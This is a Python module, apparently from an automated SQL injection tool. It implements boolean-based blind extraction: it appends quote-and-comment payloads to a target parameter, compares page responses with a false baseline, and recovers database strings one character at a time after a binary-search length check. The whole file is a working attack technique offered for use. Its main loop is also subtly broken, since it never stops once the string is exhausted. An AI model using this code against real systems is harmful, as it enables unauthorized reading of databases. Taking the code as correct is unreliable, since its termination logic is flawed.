import logging
from lib.request.client import Request

logger = logging.getLogger(__name__)

class BooleanTechnique:
    def __init__(self, request, vuln, settings):
        self.request = request
        self.vuln = vuln
        self.settings = settings
        
    def extract_string(self, expression):
        """Extract string using boolean blind"""
        result = ""
        pos = 1
        while True:
            length = self._get_length(expression)
            if length == 0:
                break
            for ascii_val in range(32, 127):
                condition = f"ASCII(SUBSTRING(({expression}),{pos},1)) = {ascii_val}"
                if self._check_condition(condition):
                    result += chr(ascii_val)
                    break
            pos += 1
        return result
    
    def _get_length(self, expression):
        low, high = 0, 5000
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"LENGTH(({expression})) >= {mid}"
            if self._check_condition(condition):
                low = mid
            else:
                high = mid - 1
        return low
    
    def _check_condition(self, condition):
        payload = f"{self.vuln['original_value']}' AND ({condition})-- -"
        resp_cond = self.request.send(self.vuln['param'], payload, self.vuln['location'])
        baseline_payload = f"{self.vuln['original_value']}' AND 1=2-- -"
        resp_base = self.request.send(self.vuln['param'], baseline_payload, self.vuln['location'])
        if resp_cond and resp_base:
            return len(resp_cond.text) != len(resp_base.text) or resp_cond.text != resp_base.text
        return False